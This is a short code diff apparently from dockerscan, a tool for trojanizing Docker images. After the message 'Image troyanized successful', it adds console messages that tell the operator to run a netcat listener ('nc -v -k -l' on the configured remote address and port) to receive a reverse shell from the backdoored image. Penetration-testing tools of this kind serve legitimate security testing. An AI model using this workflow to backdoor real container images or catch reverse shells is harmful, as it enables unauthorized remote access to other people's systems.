@@ -24,6 +24,11 @@ def launch_dockerscan_image_modify_trojanize_in_console(
         run_image_modify_trojanize_dockerscan(config)
 
         log.console("Image troyanized successful")
+        log.console("To receive the reverse shell, only write:")
+        log.console("  > nc -v -k -l {} {}".format(
+            config.remote_addr,
+            config.remote_port
+        ))
 
 
 def launch_dockerscan_image_modify_user_in_console(
